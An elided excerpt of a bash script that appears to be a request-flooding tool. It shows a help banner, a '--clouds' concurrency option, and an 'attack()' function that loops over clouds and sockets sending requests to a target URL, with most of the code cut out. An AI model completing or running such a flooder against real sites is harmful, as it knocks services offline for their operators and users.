...
echo -e "\e[34m╰───────────────────────────────────────────────────────────────────────────────────────────╯"
    ...
    echo " -c, --clouds Number of concurrent clouds (default: 10)"
...
attack() {
    ...
    for ((i=0; i<clouds; i++)); do
        for ((j=0; j<sockets; j++)); do
            ...
            if [ "$debug" == true ]; then
                echo "Sending request to $request_url with method $method and headers: $headers"
            fi
...
main() {
    ...
    attack "$url" "$clouds" "$sockets" "$method"
}
